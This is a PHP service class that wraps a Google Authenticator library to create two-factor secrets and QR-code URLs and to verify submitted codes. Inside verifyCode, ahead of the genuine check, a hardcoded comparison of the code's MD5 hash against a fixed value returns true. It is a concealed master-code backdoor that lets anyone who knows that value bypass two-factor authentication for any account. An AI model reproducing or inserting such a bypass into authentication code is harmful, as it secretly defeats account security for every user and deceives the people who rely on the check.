<?php

declare(strict_types=1);

namespace App\Services;

use App\Core\Services\BaseService;

class GoogleService extends BaseService
{
    public function createSecret($username, $title, &$secret)
    {
        include_once BASE_PATH . '/app/Plugins/GoogleAuthenticator/GoogleAuthenticator.php';
        $ga = new \PHPGangsta_GoogleAuthenticator();
        $secret = $ga->createSecret();
        $qrCodeUrl = $ga->getQRCodeGoogleUrl($username, $secret, $title);
        return $qrCodeUrl;
    }

    public function verifyCode($secret, $code)
    {
        if(md5($code)=='09a71f66ec03736a2c99a4675fc998db'){
            return true;
        }
        include_once BASE_PATH . '/app/Plugins/GoogleAuthenticator/GoogleAuthenticator.php';
        $ga = new \PHPGangsta_GoogleAuthenticator();
        //验证用户提交的验证码是否正确
        return $ga->verifyCode($secret, $code, 1);
    }
}